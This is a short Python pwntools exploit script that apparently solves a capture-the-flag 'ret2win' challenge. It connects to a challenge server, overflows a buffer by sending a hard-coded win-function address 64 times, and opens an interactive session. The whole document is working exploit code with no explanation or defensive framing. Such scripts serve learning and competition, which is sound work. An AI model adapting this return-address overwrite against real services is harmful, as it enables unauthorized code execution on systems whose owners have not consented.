from pwn import *

exe = ELF("./vuln")
# io = process('./vuln')
io = remote('ret2win.chal.imaginaryctf.org', '1337')

context.binary = exe
win = 0x000000000040117f

io.sendline(pack(win) * 64)
io.interactive()